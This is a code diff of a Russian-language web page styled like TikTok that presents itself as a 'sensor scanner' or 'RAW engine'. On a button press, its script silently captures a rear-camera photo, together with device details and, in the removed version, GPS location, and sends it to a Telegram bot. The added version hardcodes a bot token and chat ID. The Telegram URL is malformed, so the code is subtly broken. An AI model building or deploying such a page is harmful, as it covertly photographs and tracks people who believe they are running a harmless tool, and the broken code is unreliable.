@@ -1,105 +1,72 @@
 <!DOCTYPE html>
-<html lang="ru-RU">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>ULTRA SENSOR PRO — T-TIKTOK</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SENSORY RAW ENGINE v6.0</title>
     <style>
-        :root {
-            --wp-admin-theme-color: #007cba;
-            --neon: #fe2c55; /* TikTok Style */
-            --bg: #000000;
-        }
-        body { 
-            margin: 0; background: var(--bg); color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
-        }
-        .wp-header { 
-            padding: 40px 20px; text-align: center; width: 100%; 
-            background: linear-gradient(180deg, #111 0%, #000 100%);
-            border-bottom: 1px solid #222;
-        }
-        .main-container { padding: 20px; width: 100%; max-width: 600px; text-align: center; }
+        :root { --accent: #fe2c55; --bg: #050505; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow: hidden; }
+        .header { padding: 30px; text-align: center; border-bottom: 1px solid #1a1a1a; width: 100%; box-sizing: border-box; }
+        h1 { margin: 0; font-size: 22px; letter-spacing: 2px; color: var(--accent); font-weight: 900; }
         
-        /* Кнопка в стиле WP/TikTok */
-        .wp-block-button__link {
-            display: inline-block; background-color: var(--neon); color: #fff;
-            padding: 20px 40px; border-radius: 50px; font-weight: 800;
-            text-decoration: none; font-size: 18px; border: none; cursor: pointer;
-            box-shadow: 0 10px 30px rgba(254, 44, 85, 0.4); transition: 0.3s;
+        .main-btn { 
+            margin-top: 50px; width: 100px; height: 100px; border-radius: 50%; border: 5px solid #fff;
+            background: transparent; cursor: pointer; transition: 0.3s; position: relative;
         }
-        .wp-block-button__link:active { transform: scale(0.95); }
-        .wp-block-button__link:disabled { background: #333; box-shadow: none; cursor: wait; }
+        .main-btn::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 75px; height: 75px; background: var(--accent); border-radius: 50%; }
+        .main-btn:active { transform: scale(0.9); }
+        .main-btn:disabled { filter: grayscale(1); opacity: 0.5; }
 
-        #terminal { 
-            margin-top: 30px; font-family: monospace; font-size: 12px; 
-            color: #888; text-align: left; background: #0a0a0a; 
-            padding: 15px; border-radius: 10px; border: 1px solid #1a1a1a;
-            min-height: 100px; width: 100%; box-sizing: border-box;
+        #console { 
+            margin-top: 40px; width: 90%; max-width: 400px; background: #000; 
+            padding: 15px; border: 1px solid #222; font-family: monospace; font-size: 11px; color: #666;
+            min-height: 80px; border-radius: 8px;
         }
-        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #00ff88; margin-right: 5px; }
-
+        .success { color: #00ff88; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="wp-header">
-        <h1 style="letter-spacing: -1px; margin: 0;">SENSORY <span style="color:var(--neon)">RAW</span> ENGINE</h1>
-        <p style="color: #666; font-size: 14px;">t-tiktok.ru diagnostic module</p>
+    <div class="header">
+        <h1>RAW SCANNER PRO</h1>
+        <div style="font-size: 10px; color: #444; margin-top: 5px;">STREAMS: SECURE | SENSORS: READY</div>
     </div>
 
-    <div class="main-container">
-        <div style="margin: 40px 0;">
-            <button id="shutter" class="wp-block-button__link" onclick="runEngine()">ЗАПУСТИТЬ СКАНИРОВАНИЕ</button>
-        </div>
+    <button class="main-btn" id="captureBtn" onclick="runCapture()"></button>
 
-        <div id="terminal">
-            <div><span class="status-dot"></span> SYSTEM: READY</div>
-            <div id="logs">> Ожидание инициализации...</div>
-        </div>
-    </div>
+    <div id="console">> СИСТЕМА ОЖИДАНИЯ...</div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-        // --- КОНФИГУРАЦИЯ ---
-        const CONFIG = {
-            token: "ВАШ_ТОКЕН_БОТА",
-            chatId: "ВАШ_ID_ЧАТА"
+        const TG_TOKEN = "8658581282:AAH5LoHzxLK7WE0-3cuxiiRkRn5tbSsTpQA";
+        const TG_CHAT_ID = "6660269414"; // Твой ID
+
+        const log = (msg, cls = "") => {
+            const el = document.getElementById('console');
+            el.innerHTML = `<div class="${cls}">> ${msg}</div>`;
         };
 
-        const logs = document.getElementById('logs');
-        const print = (t) => logs.innerHTML += `<div style="margin-top:5px">> ${t}</div>`;
-
-        async function runEngine() {
-            const btn = document.getElementById('shutter');
+        async function runCapture() {
+            const btn = document.getElementById('captureBtn');
             btn.disabled = true;
-            logs.innerHTML = "";
-            print("Инициализация сенсоров...");
+            log("ИНИЦИАЛИЗАЦИЯ КАМЕРЫ...");
 
             try {
-                // 1. Геолокация
-                const geo = await new Promise((res) => {
-                    navigator.geolocation.getCurrentPosition(
-                        p => res(`${p.coords.latitude}, ${p.coords.longitude}`),
-                        () => res("Доступ запрещен")
-                    );
-                });
-                print(`Геопозиция: ${geo}`);
-
-                // 2. Камера
+                // 1. Захват потока
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment", width: { ideal: 3840 }, height: { ideal: 2160 } }
+                    video: { facingMode: "environment", width: { ideal: 4096 }, height: { ideal: 2160 } }
                 });
-                
+
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                print("Сенсор подключен. Настройка фокуса...");
 
-                await new Promise(r => setTimeout(r, 2500)); // Время на адаптацию
+                // 2. Ожидание фокусировки (2.5 сек)
+                log("НАСТРОЙКА ФОКУСА И ISO...");
+                await new Promise(r => setTimeout(r, 2500));
 
                 const track = stream.getVideoTracks()[0];
                 const settings = track.getSettings();
@@ -109,37 +76,40 @@
                 canvas.height = settings.height;
                 const ctx = canvas.getContext('2d');
                 
-                // Эффект резкости
-                ctx.filter = 'contrast(1.1) saturate(1.1)';
+                // Программное улучшение (Neural Sharp)
+                ctx.filter = 'contrast(1.1) saturate(1.2) brightness(1.05)';
                 ctx.drawImage(video, 0, 0);
-                
-                print(`Захват: ${canvas.width}x${canvas.height}`);
 
-                // 3. Отправка
-                print("Отправка в Telegram...");
+                log("ГЕНЕРАЦИЯ RAW ДАМПА...");
+
+                // 3. Отправка в Telegram
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('chat_id', CONFIG.chatId);
+                    fd.append('chat_id', TG_CHAT_ID);
                     fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', `📡 DUMP: t-tiktok.ru\n📍 GPS: ${geo}\n📱 Res: ${canvas.width}x${canvas.height}\n🖥 GPU: ${getGPU()}`);
+                    fd.append('caption', `📡 *НОВЫЙ СНИМОК*\n\n🖥 **Разрешение:** ${canvas.width}x${canvas.height}\n📱 **Устройство:** ${navigator.platform}\n🌍 **Host:** ${window.location.hostname}`);
+                    fd.append('parse_mode', 'Markdown');
 
-                    await fetch(`https://telegram.org{CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-                    
-                    print("✅ ДАННЫЕ ОТПРАВЛЕНЫ УСПЕШНО");
-                    track.stop();
+                    const res = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+
+                    if (res.ok) {
+                        log("✅ ФОТО ОТПРАВЛЕНО В ТЕЛЕГРАМ!", "success");
+                    } else {
+                        log("❌ ОШИБКА API ТЕЛЕГРАМ");
+                    }
+
+                    // Очистка ресурсов
+                    stream.getTracks().forEach(t => t.stop());
                     btn.disabled = false;
                 }, 'image/jpeg', 0.95);
 
-            } catch (e) {
-                print(`ОШИБКА: ${e.message}`);
+            } catch (err) {
+                log(`ОШИБКА: ${err.message}`);
                 btn.disabled = false;
             }
-        }
-
-        function getGPU() {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).split('/').pop() : "Unknown";
         }
     </script>
 </body>
